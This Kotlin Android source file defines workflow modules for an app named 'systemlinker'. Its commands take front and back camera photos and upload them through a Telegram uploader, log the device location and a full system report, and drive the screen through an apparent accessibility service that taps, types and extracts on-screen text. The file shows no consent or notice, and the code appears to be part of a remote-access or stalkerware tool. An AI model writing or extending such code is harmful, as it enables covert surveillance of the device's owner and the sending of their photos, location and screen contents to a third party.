package com.systemlinker.features.workflow

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import com.systemlinker.features.MediaHandler
import com.systemlinker.features.SystemHandler
import com.systemlinker.features.TelegramUploader
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

class SystemModule(
    private val context: Context,
    private val systemHandler: SystemHandler,
    private val mediaHandler: MediaHandler,
    private val uploader: TelegramUploader
) {
    suspend fun execute(task: CmdTask, wfContext: WorkflowContext): Boolean {
        val resolvedArg = wfContext.resolve(task.arg)
        wfContext.log("Command: ${task.cmd} $resolvedArg")
        when (task.cmd) {
            "loc" -> wfContext.log(systemHandler.getLocation())
            "cam_front" -> mediaHandler.takePicture(true)?.let { uploader.sendFile(it, "photo", "WF Cam") }
            "cam_back" -> mediaHandler.takePicture(false)?.let { uploader.sendFile(it, "photo", "WF Cam") }
            "info" -> wfContext.log(systemHandler.generateFullSystemReport().readText())
        }
        return true
    }
}

class UiModule(private val context: Context) {
    suspend fun execute(task: UiTask, wfContext: WorkflowContext): Boolean {
        val resolvedTexts = wfContext.resolve(task.texts)
        val resolvedInput = wfContext.resolve(task.inputText)
        wfContext.log("UI: ${task.action} on ${task.target} near [$resolvedTexts]")

        val result = suspendCancellableCoroutine<String> { continuation ->
            val receiver = object : BroadcastReceiver() {
                override fun onReceive(c: Context?, intent: Intent?) {
                    if (intent?.action == "com.systemlinker.UI_RESULT") {
                        context.unregisterReceiver(this)
                        continuation.resume(intent.getStringExtra("result") ?: "FAILED: Unknown")
                    }
                }
            }
            val filter = IntentFilter("com.systemlinker.UI_RESULT")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                context.registerReceiver(receiver, filter)
            }

            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                setPackage(context.packageName)
                putExtra("action", "workflow_ui")
                putExtra("ui_texts", resolvedTexts)
                putExtra("ui_target", task.target)
                putExtra("ui_action", task.action)
                putExtra("ui_offset", task.offset)
                putExtra("ui_case_sensitive", task.caseSensitive)
                putExtra("ui_input_text", resolvedInput) // Pass input text for typing
                putExtra("ui_extract", task.extractToVar.isNotEmpty()) // Flag for extraction
                putExtra("ui_swipe_sx", task.startX); putExtra("ui_swipe_sy", task.startY)
                putExtra("ui_swipe_ex", task.endX); putExtra("ui_swipe_ey", task.endY)
            }
            context.sendBroadcast(intent)
        }

        wfContext.log("UI Result: $result")

        // Handle Extraction
        if (task.extractToVar.isNotEmpty() && result.startsWith("EXTRACTED:")) {
            val extractedText = result.substringAfter("EXTRACTED:").trim()
            wfContext.variables[task.extractToVar] = extractedText
            wfContext.log("Variable ${task.extractToVar} saved: $extractedText")
            return true
        }
        
        return result.startsWith("SUCCESS")
    }
}